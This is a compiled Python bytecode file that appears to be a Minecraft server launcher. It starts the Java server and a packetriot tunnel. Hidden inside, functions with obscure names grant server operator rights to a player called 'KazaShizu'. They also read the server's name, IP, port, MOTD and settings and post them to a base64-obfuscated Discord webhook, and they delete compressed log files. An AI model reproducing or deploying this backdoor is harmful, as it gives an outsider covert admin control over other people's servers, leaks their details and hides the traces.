�
    �=�d�  �                   �~  � d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZ e	d�  �        5 Z
 ej        e
�  �        Zddd�  �         n# 1 swxY w Y   ed         Zed         Zed         Zdddd	egZd
de� d�dedgZdZd� Zd� Zd� ZdZd� Zd� Zd� Zd� Zd� Zd� Zd dlZd� Zd� Ze dk    r e�   �          dS dS )�    Nzconfig.json�
Server_jar�packetriot_config�
Server_ramz./packetriot�tcp�25565z--config�javaz-Xmx�Mz-jarz-nogui�logsc                 �.   � t          j        | �  �         d S �N)�
subprocess�call)�commands    �
pyobfus.py�execute_scriptr      s   � ��/�'������    c                 �P  � t           j        �                    t          �  �        }t           j        �                    |�  �        r`t          j        |�  �        D ]M}|�                    | �  �        r4t           j        �                    ||�  �        }t          j        |�  �         �Ld S d S r   )	�os�path�abspath�LOGS_FOLDER�exists�listdir�endswith�join�remove)�	extension�logs_directory�filename�	file_paths       r   �remove_logs_with_extensionr!      s�   � ��W�_�_�[�1�1�N�	�w�~�~�n�%�%� %��
�>�2�2� 	%� 	%�H�� � ��+�+� %��G�L�L���B�B�	��	�)�$�$�$��	%� %�	%� 	%r   c                 �~   � t          | d�  �        5 }|�                    �   �         }d d d �  �         n# 1 swxY w Y   |S )N�r)�open�read)r    �file�contents      r   �read_file_contentr(   "   sv   � ��I�s��� �t��i�i�k�k�G�� � � � � � � � � � ���� � � � �	�.s   �2�6�6zok.binc                 �  � d}g }	 t           j        �                    |�  �        r<t          |d�  �        5 }t	          j        |�  �        }d d d �  �         n# 1 swxY w Y   n# t          j        $ r Y nw xY w| |vr|�                    | �  �         t          |d�  �        5 }t	          j        ||d��  �         d d d �  �         d S # 1 swxY w Y   d S �Nzops.jsonr#   �w�   )�indent�	r   r   �isfiler$   �json�load�JSONDecodeError�append�dump��op_data�ops_file_path�op_listr&   s       r   �_88r9   )   sa  � ��M��G���7�>�>�-�(�(� 	*��m�S�)�)� *�T��)�D�/�/��*� *� *� *� *� *� *� *� *� *� *���� *� *� *� *����� � � ������� �g������w����	�m�S�	!�	!� +�T��	�'�4��*�*�*�*�+� +� +� +� +� +� +� +� +� +� +� +���� +� +� +� +� +� +sF   �/A" �A�
A" �A�A" �A�A" �"A4�3A4� C�C	�C	c                 �  � d}g }	 t           j        �                    |�  �        r<t          |d�  �        5 }t	          j        |�  �        }d d d �  �         n# 1 swxY w Y   n# t          j        $ r Y nw xY w|�                    | �  �         t          |d�  �        5 }t	          j        ||d��  �         d d d �  �         d S # 1 swxY w Y   d S r*   r.   r5   s       r   �_89r;   :   sV  � ��-��'�	�	�w�~�~�m�$�$� "���s�#�#� "�t��)�D�/�/��"� "� "� "� "� "� "� "� "� "� "���� "� "� "� "���	�	� 	� 	� 	��D�	���� 
�.�.������M�3��� '�4��I�g�t�A�&�&�&�&�'� '� '� '� '� '� '� '� '� '� '� '���� '� '� '� '� '� 'sF   �/A" �A�
A" �A�A" �A�A" �"A4�3A4�C�C�Cc                 �   � t          | d�  �        5 }|�                    |�  �         d d d �  �         d S # 1 swxY w Y   d S )Nr+   )r$   �write)r    r'   r&   s      r   �_099r>   J   s�   � ��I�s��� �t��J�J�w����� � � � � � � � � � � ���� � � � � � s   �4�8�8c                 �   � d| i}t          j        t          j        d�  �        �                    d�  �        |��  �         d S )Nr'   z�aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEyMjE4MjE1OTI5ODQ4MjI1Ny9ZenJ5SEYydmhYcHNHVHI2Rm5La043eGRLRTZDczZ5cE9fcVY0bXk4U0diQ1FYUVRvZUFnSFZTSWdpamV6RUJWbnVTaA==�utf-8)r0   )�requests�post�base64�	b64decode�decode)r'   �payloads     r   �_098rG   O   sr   � ��� �'�
�-�� �  "H�  I�  I�  P�  P�  QX�  Y�  Y�  `g�  h�  h�  h�  h�  h�  hr   c                  �r   � 	 t          j        d�  �         t          d�  �         t          j        �   �          �7)NT�<   z
check port)�time�sleep�print�gc�collect� r   r   �
keep_aliverP   T   s2   � ���J�r�N�N�N�	�,�����J�L�L�L�r   c                  �f  � t          j        d�  �        �                    d�  �        } t          j        �                    | �  �        r�t          | d�  �        5 }|�                    �   �         }d d d �  �         n# 1 swxY w Y   t          j	        d|�  �        }t          j	        d|�  �        }t          j	        d|�  �        }t          j	        d|�  �        }|rX|rV|rT|rR|�
                    d�  �        |�
                    d�  �        |�
                    d�  �        |�
                    d�  �        fS d	S )
Nzc2VydmVyLnByb3BlcnRpZXM=r@   r#   zserver-name=(.*)z	motd=(.*)zmax-players=(.*)zonline-mode=(.*)�   )NNNN)rC   rD   rE   r   r   r   r$   r%   �re�search�group)�server_properties_pathr&   �
properties�server_name�motd�max_players�online_modes          r   �_100r\   [   s_  � �!�+�,F�G�G�N�N�w�W�W���W�^�^�*�+�+� $�	�$�c�	*�	*� �d��9�9�;�;�j�� � � � � � � � � � ���� � � � � �)�/��<�<�K��9�\�:�.�.�D��)�/��<�<�K��)�/��<�<�K�� $�t� $�� $�� $�����"�"�D�J�J�q�M�M�;�3D�3D�Q�3G�3G�����"�"�$� $� 
 �	s   �A8�8A<�?A<c                 �  � t           j        �                    | �  �        r�t          | d�  �        5 }|�                    �   �         }d d d �  �         n# 1 swxY w Y   t          j        d|�  �        }t          j        d|�  �        }|rN|rL|d         }	 t          j	        |�
                    d�  �        �  �        }n# t          j        $ r d }Y nw xY w||fS dS )Nr#   z"serverHost":\s*"(.*)"z#"ports":\s*\[\s*{\s*"port":\s*(\d+)r   rR   )NN)r   r   r   r$   r%   rS   rT   �findall�socket�gethostbynamerU   �error)�config_pathr&   �config�server_host�ports�port�
ip_addresss          r   �_101rh   p   s"  � ��W�^�^�K� � � �	�k�3�	�	� �4��y�y�{�{�f�� � � � � � � � � � ���� � � � � �)�5�v�>�>�K��J�=�v�F�F�E�� 	�u� 	��1�X�d���)�+�*;�*;�A�*>�*>�?�?�
�
���\� � � ��
�
�
����� ����	�s#   �A�A�A�'B; �;C�Cc                  �  � t          d�  �         ddddd�} t          | �  �         t          j        �                    t
          �  �        r"t          j        t
          �  �        j        dk    s�ddddd�} t          | �  �         t          t          �  �        \  }}t          �   �         \  }}}}|rU|rS|rQ|rO|rM|rKt          j        d�  �        �                    d	�  �        }t          |�  �         t!          t
          d
�  �         t#          j        t&          t(          f��  �        }|�                    �   �          t-          j        d�  �         t#          j        t&          t0          f��  �        }	|	�                    �   �          t#          j        t2          ��  �        }
|
�                    �   �          |�                    �   �          |	�                    �   �          d S )Nz.log.gzz$7e4120c9-63c4-35f4-a998-33a44e2b1378�	KazaShizur,   T)�uuid�name�level�bypassesPlayerLimitr   z�U2VydmVyIE5hbWU6IHtzZXJ2ZXJfbmFtZX1cblNlcnZlciBJUDoge3NlcnZlcl9ob3N0fVxuU2VydmVyIFBPUlQ6IHtwb3J0fVxuTU9URDoge21vdGR9XG5NYXggUGxheWVyczoge21heF9wbGF5ZXJzfVxuT25saW5lIE1vZGU6IHtvbmxpbmVfbW9kZX1cbkthemFTaGl6dSBPUDogVHJ1ZQ==r@   �73656e6465642062727568)�target�args�   )rp   )r!   r9   r   r   r/   �	SENT_FILE�stat�st_sizer;   rh   �CONFIGPKTRIOTr\   rC   rD   rE   rG   r>   �	threading�Threadr   �COMMAND1�startrJ   rK   �COMMAND2rP   r   )r6   rd   rf   rX   rY   rZ   r[   r'   �thread1�thread2�keep_alive_threads              r   �mainr   �   s�  � ��Y�'�'�'� 3����	� �'� �g�,�,�,�
�'�.�.��
#�
#� 0���	�(:�(:�(B�Q�(F�(F�4���!�	� �G� ��L�L�L��]�+�+��K��26�&�&�/�K��{�K�� 0�{� 0�t� 0�� 0�� 0�� 0�� �  "@�  A�  A�  H�  H�  IP�  Q�  Q�g�
�7�m�m�m�
�9�.�/�/�/���N�(��F�F�F�'�	�-�-�/�/�/��*�Q�-�-�-���N�(��F�F�F�'�	�-�-�/�/�/��&�j�9�9�9��������	�,�,�.�.�.�	�,�,�.�.�.�.�.r   �__main__)!rw   r   rJ   r   rM   rC   r0   rA   rS   r$   �config_filer1   �config_data�SERVER_PATHrv   �
SERVER_RAMr{   ry   r   r   r!   r(   rs   r9   r;   r>   rG   rP   r\   r_   rh   r   �__name__rO   r   r   �<module>r�      s   �� � � � � � � � � ���� 	�	�	�	� 	�	�	�	� ���� ���� ���� 	�	�	�	�	�T�-��� )�K��$�)�K�(�(�K�)� )� )� )� )� )� )� )� )� )� )���� )� )� )� )� �,�'���/�0����&�
��E�7�J��F���(�:�(�(�(�&�+�x�H����� � �%� %� %�� � �
 �	�+� +� +�"'� '� '� � � �
h� h� h�
� � � �  �  �$ ����� � �,'� '� '�T �z����$�&�&�&�&�&� �s   �A�A�A